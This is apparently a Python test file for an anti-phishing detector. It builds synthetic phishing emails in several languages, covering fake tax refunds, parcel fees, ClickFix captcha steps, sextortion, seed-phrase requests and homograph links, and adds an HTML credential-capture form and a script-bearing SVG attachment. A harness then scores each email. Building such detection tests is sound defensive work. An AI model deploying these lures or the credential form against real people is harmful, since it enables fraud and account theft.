        auth=_auth("raiffeisen-ebanking.top", policy="none")))

    add("bs_posta_customs_fee", eml(
        "Pošta Srbije <obavestenje@dostava-paketa-info.com>", "Vaša pošiljka čeka carinjenje",
        html=_html("<p>Poštovani,</p><p>Vaša pošiljka RR123456785RS zadržana je u carinskom skladištu. Potrebno je "
                   "uplatiti naknadu za carinjenje u iznosu od 2,49 EUR u roku od 48 sati, u suprotnom će paket biti "
                   "vraćen pošiljaocu.</p><a href='https://posta-carina.click/uplata?id=RR123456785RS'>Plati naknadu"
                   "</a>"),
        auth=_auth("dostava-paketa-info.com", mode="nodmarc")))

    add("sv_skatteverket_refund", eml(
        "Skatteverket <noreply@skatteverket-aterbetalning.com>", "Du har en återbetalning på 4 812 kr att hämta",
        to=RCPT_SE,
        html=_html("<p>Hej,</p><p>Efter den senaste beräkningen har du rätt till en skatteåterbäring på 4 812,00 kr. "
                   "Bekräfta dina uppgifter och ditt kontonummer med BankID inom 3 dagar för att få pengarna "
                   "utbetalda.</p><a href='https://skatteverket-aterbetalning.com/bankid'>Logga in med BankID</a>"),
        auth=_auth("skatteverket-aterbetalning.com", policy="none")))

    add("sv_postnord_fee", eml(
        "PostNord <info@paket-leverans-se.xyz>", "Din försändelse är stoppad - åtgärd krävs", to=RCPT_SE,
        html=_html("<p>Din försändelse kunde inte levereras eftersom tullavgiften på 19,00 kr inte är betald. "
                   "Betala avgiften inom 24 timmar, annars returneras paketet till avsändaren.</p>"
                   "<a href='https://postnord.paket-leverans-se.xyz/betala'>Betala avgiften</a>"),
        auth=_auth("paket-leverans-se.xyz", mode="nodmarc")))

    cred_form = (b"<html><body><h2>Sign in to view the secured document</h2><form action='https://collect.form-"
                 b"drop.top/p.php' method='post'><input type='email' name='u'><input type='password' name='p'>"
                 b"<input type='submit' value='View document'></form></body></html>")
    add("html_attachment_credential_form", eml(
        "Accounts Payable <ap@nordic-supplies-invoices.com>", "Remittance advice - payment 44,120.00 EUR",
        text="Please find the remittance advice for the payment made today in the attached secure document.",
        auth=_auth("nordic-supplies-invoices.com", mode="nodmarc"),
        attachments=[("Remittance_Advice.html", "text/html", cred_form)]))

    svg = (b"<svg xmlns='http://www.w3.org/2000/svg' width='400' height='200'><script>var d=atob('aHR0cHM6Ly9leGFtcGxl');"
           b"window.location.href=d;</script><text x='10' y='40'>Loading voicemail...</text></svg>")
    add("svg_attachment_script", eml(
        "Voicemail Service <voicemail@callcenter-notify.net>", "New voicemail (0:47) from +387 33 555 010",
        text="You received a new voice message. Open the attachment to listen.",
        auth=_auth("callcenter-notify.net", mode="nodmarc"),
        attachments=[("Voicemail_0047.svg", "image/svg+xml", svg)]))

    add("zip_with_exe_double_extension", eml(
        "Ivana Jurić <ivana.juric@transport-logistika.hr>", "Narudžbenica PO-77812",
        text="Poštovani,\n\nu prilogu je narudžbenica PO-77812. Molim potvrdu roka isporuke.\n\nLp, Ivana",
        auth=_auth("transport-logistika.hr", mode="nodmarc"),
        attachments=[("PO-77812.zip", "application/zip", _zip({"PO-77812.pdf.exe": FAKE_EXE}))]))

    add("fake_quarantine_release_ipfs", eml(
        "Mail Server <postmaster@mail-gateway-alerts.net>", f"{RCPT}: 5 pending messages held",
        html=_html(f"<p>You have 5 pending messages that could not be delivered to {RCPT} because your mailbox "
                   "storage is almost full.</p><p><a href='https://ipfs.io/ipfs/bafybeigdyrzt5examplecid/index.html?"
                   "e=amra'>Release messages to inbox</a></p><p>Messages will be deleted after 48 hours.</p>"),
        auth=_auth("mail-gateway-alerts.net", policy="none")))

    add("voicemail_google_redirect", eml(
        "Voice Message <vm@ring-central-notify.com>", "You have a new voice message from HR",
        html=_html("<p>You received a new voice message.</p><p>Duration: 00:38</p><a href='https://www.google.com/url?"
                   "q=https%3A%2F%2Fvm-portal-login.web.app%2Flisten&sa=D&sntz=1'>Play message</a><p>Sign in with your "
                   "work account to listen.</p>"),
        auth=_auth("ring-central-notify.com", mode="nodmarc")))

    add("metamask_seed_phrase", eml(
        "MetaMask Support <support@metamask-walletverify.io>", "Wallet verification required",
        html=_html("<p>Dear user,</p><p>Due to a security upgrade, all wallets must be verified before 30 November. "
                   "Unverified wallets will be restricted. Verify your wallet using your 12-word recovery phrase.</p>"
                   "<a href='https://metamask-walletverify.io/sync'>Verify wallet</a>"),
        auth=_auth("metamask-walletverify.io", policy="none")))

    add("sextortion_bitcoin_plain", eml(
        "Unknown <k.varga1991@seznam.cz>", "I know your password",
        text="Hello. I have hacked your device and installed a remote access tool. I recorded you through your "
             "webcam while you were visiting adult sites. Pay 900 USD in bitcoin to the wallet address below within "
             "48 hours or I will send the video to all your contacts.\nBTC wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        auth=_auth("seznam.cz", policy="none")))

    add("netflix_billing_esp_dmarc_pass", eml(
        "Netflix <info@netflix-billing-update.com>", "Your payment was declined",
        html=_html("<p>Hi,</p><p>We're having some trouble with your current billing information. Update your "
                   "payment method within 48 hours to avoid suspension of your membership.</p><a href='https://"
                   "netflix-billing-update.com/account'>UPDATE ACCOUNT NOW</a>",
                   _UNSUB_FOOT.format(u="https://netflix-billing-update.com/u", p="https://netflix-billing-update.com/p")),
        auth=_auth("netflix-billing-update.com"), list_unsub="<https://netflix-billing-update.com/unsub>"))

    add("image_only_lure_shortener", eml(
        "Shared Files <share@files-portal-secure.com>", "Document shared with you",
        html="<html><body><a href='https://bit.ly/3xQrT9z'><img src='https://files-portal-secure.com/i/doc.png' "
             "width='600'></a></body></html>",
        auth=_auth("files-portal-secure.com", mode="nodmarc")))

    add("compromised_partner_sharepoint_lookalike", eml(
        "Marko Marković <marko.markovic@partner-doo.rs>", "Marko Marković shared \"Ugovor_2026_final.pdf\" with you",
        html=_html("<p>Marko Marković shared a file with you</p><p>Ugovor_2026_final.pdf</p><a href='https://pub-"
                   "4f1a9c2b77.r2.dev/sharepoint/index.html'>Open</a><p>This link will work for anyone with the link. "
                   "Sign in with your email credentials to view.</p>"),
        auth=_auth("partner-doo.rs", policy="quarantine")),
        "sent from a real, fully authenticated (compromised) partner mailbox")

    add("clickfix_fake_captcha", eml(
        "Booking Support <support@reservation-verify-desk.com>", "Guest complaint - action needed on your reservation",
        html=_html("<p>A guest left a complaint about your property. To view it, complete the verification:</p>"
                   "<p>1. Press Windows + R<br>2. Press Ctrl + V<br>3. Press Enter</p><p>Verification ID: 88213</p>"
                   "<a href='https://reservation-verify-desk.com/captcha'>Open verification page</a>"),
        auth=_auth("reservation-verify-desk.com", mode="nodmarc")))

    ics = ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nSUMMARY:Mandatory compliance "
           "training\r\nDTSTART:20261127T090000Z\r\nDESCRIPTION:Accept the invite and sign in with your corporate "
           "credentials here https://training-portal-login.top/sso before Friday.\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n")
    add("calendar_invite_phish_ics", eml(
        "HR Department <hr@people-ops-portal.com>", "Invitation: Mandatory compliance training",
        text="You have been invited to an event. See the attached invitation.",
        auth=_auth("people-ops-portal.com", mode="nodmarc"),
        attachments=[("invite.ics", "text/calendar", ics.encode())]))

    add("punycode_homograph_link", eml(
        "Apple Support <support@apple-id-notice.com>", "Your Apple ID has been locked",
        html=_html("<p>Dear customer,</p><p>Your Apple ID was locked for security reasons. Unlock your account "
                   "within 24 hours.</p><a href='https://xn--pple-43d.com/unlock'>Unlock Apple ID</a>"),
        auth=_auth("apple-id-notice.com", policy="none")))

    add("platform_abuse_paypal_invoice_callback", eml(
        "\"service@paypal.com\" <service@paypal.com>", "Invoice from Geek Squad Services (#INV-88213)",
        html=_html("<p>Hello,</p><p>Geek Squad Services sent you an invoice for $549.99 USD.</p><p>Seller note to "
                   "customer: Your Geek Squad subscription has been renewed and $549.99 was charged. If you did not "
                   "authorize this transaction call +1 (888) 423-1943 immediately to cancel and get a refund.</p>"
                   "<a href='https://www.paypal.com/invoice/payerView/details/INV2-88213'>View and Pay Invoice</a>"),
        auth=_auth("paypal.com")),
        "REAL PayPal infrastructure abused: only the wording gives it away")

    add("apple_id_embedded_domain", eml(
        "Apple <noreply@id-apple-support.com>", "Your Apple ID was used to sign in on a new device",
        html=_html("<p>Your Apple ID was used to sign in to iCloud on an iPhone 15 near Moscow. If this was not you, "
                   "your account may be compromised.</p><a href='http://appleid.apple.com.account-verify.top/'>Verify "
                   "your identity</a>"),
        auth=_auth("id-apple-support.com", mode="nodmarc")))

    add("homoglyph_body_zero_width", eml(
        "Account Team <team@secure-notify-center.com>", "Unusuаl sign-in аctivity",
        html=_html("<p>We detected unusuаl sign-in аctivity on your P\u200ba\u200by\u200bP\u200ba\u200bl accоunt. "
                   "Cоnfirm yоur pаssword to keep your accоunt.</p><a href='https://secure-notify-center.com/pp'>"
                   "Review activity</a>"),
        auth=_auth("secure-notify-center.com", mode="nodmarc")))

    add("bs_tax_refund_freehost", eml(
        "Uprava za indirektno oporezivanje <povrat@uio-obavijesti.com>", "Obavijest o povratu PDV-a",
        html=_html("<p>Poštovani,</p><p>Nakon obrade Vaše prijave ostvarili ste pravo na povrat PDV-a u iznosu od "
                   "412,50 KM. Da biste primili sredstva, popunite obrazac i potvrdite podatke svoje kartice.</p>"
                   "<a href='https://uio-povrat.weebly.com/obrazac'>Popuni obrazac</a>"),
        auth=_auth("uio-obavijesti.com", mode="nodmarc")))
    return S


def _holdout() -> list[Scenario]:
    """Written after the rules were frozen. Filled in by scenarios_holdout.py
    so that this file documents the dev set only."""
    try:
        from .scenarios_holdout import holdout_scenarios
    except ImportError:
        return []
    return holdout_scenarios()


def all_scenarios() -> list[Scenario]:
    return _legit_dev() + _phish_dev() + _holdout()


def run_scenarios(pipe=None, verbose: bool = False, group: str | None = None) -> dict:
    """Run every scenario through parse -> analyze_email.
    pipe: model to use (default: the installed production model)."""
    from . import config, detector
    from .email_parser import message_from_bytes_robust, parse_message
    old_model, old_sandbox = detector._model, config.ATTACHMENT_SANDBOX
    if pipe is not None:
        detector._model = pipe
    config.ATTACHMENT_SANDBOX = False
    rows = []
    try:
        for sc in all_scenarios():
            if group and sc.group != group:
                continue
            r = detector.analyze_email(parse_message(message_from_bytes_robust(sc.raw)),
                                       use_url_intel=False, use_llm=False)
            rows.append({"name": sc.name, "kind": sc.kind, "group": sc.group, "score": r["score"],
                         "level": r["level"], "ml": r["ml_phishing_probability"], "note": sc.note,
                         "signals": [f"{s['signal']}({s['weight']:+})" for s in r["signals"] if s["weight"]]})
    finally:
        detector._model, config.ATTACHMENT_SANDBOX = old_model, old_sandbox

    out: dict = {"rows": rows, "summary": {}}
    for g in sorted({r["group"] for r in rows}):
        for kind in ("legit", "phish"):
            sel = [r for r in rows if r["group"] == g and r["kind"] == kind]
            if not sel:
                continue
            n = len(sel)
            lv = {k: sum(r["level"] == k for r in sel) for k in ("LOW", "SUSPICIOUS", "HIGH", "CRITICAL")}
            out["summary"][f"{g}_{kind}"] = dict(n=n, **lv)
    if verbose:
        print("\nSCENARIO SUITE (modern mail with real-looking headers; see antiphish/scenarios.py)")
        for key, s in out["summary"].items():
            if key.endswith("legit"):
                print(f"  {key:16s} n={s['n']:2d}: LOW {s['LOW']}, SUSPICIOUS {s['SUSPICIOUS']}, "
                      f"HIGH {s['HIGH']}, CRITICAL {s['CRITICAL']}   (ideal: all LOW)")
            else:
                print(f"  {key:16s} n={s['n']:2d}: LOW {s['LOW']}, SUSPICIOUS {s['SUSPICIOUS']}, "
                      f"HIGH {s['HIGH']}, CRITICAL {s['CRITICAL']}   (ideal: all HIGH/CRITICAL)")
        bad = [r for r in rows if (r["kind"] == "legit" and r["level"] != "LOW")
               or (r["kind"] == "phish" and r["level"] in ("LOW", "SUSPICIOUS"))]
        for r in bad:
            print(f"    {'FALSE ALARM' if r['kind'] == 'legit' else 'UNDER-RATED':11s} [{r['group']}] {r['name']:42s} "
                  f"{r['score']:5.1f} {r['level']:10s} ml={r['ml']:.2f} {' '.join(r['signals'][:6])}")
    return out
